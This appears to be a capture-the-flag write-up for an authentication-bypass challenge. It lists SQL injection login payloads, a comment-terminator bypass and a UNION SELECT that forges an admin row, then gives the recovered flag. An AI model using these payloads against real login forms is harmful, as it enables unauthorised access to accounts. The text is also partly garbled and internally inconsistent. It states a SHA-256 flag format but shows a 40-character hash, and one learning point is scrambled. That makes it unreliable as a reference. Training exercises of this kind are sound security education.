# CTF Challenge: Authentication Bypass

## Challenge Information

| Field | Details |
|-------|---------|
| Name | Auth Bypass Master |
| Difficulty | Hard |
| Points | 500 |
| Category | Authentication |
| Flag Format | `KB{sha256}` |

## Description

The admin panel at `/admin` is protected, but there's a way in. Find the vulnerability and get the admin flag.

## Target

```
URL: https://ctf.burpkb.com/challenge/auth-bypass
```

## Solution

### Step 1: Find the Login Page

```
GET /login
```

### Step 2: Test for SQL Injection

```
Username: admin'--
Password: anything
```

### Step 3: Bypass with UNION

```
Username: admin' UNION SELECT 1,'admin','password'--
Password: password
```

### Step 4: Get Flag

After logging in as admin:

```
KB{d033e22ae348aeb5660fc2140aec35850c4da997}
```

---

## Learning Points

- Always test authentication endpoints
- SQL login forms injection in
- Password hashing concepts
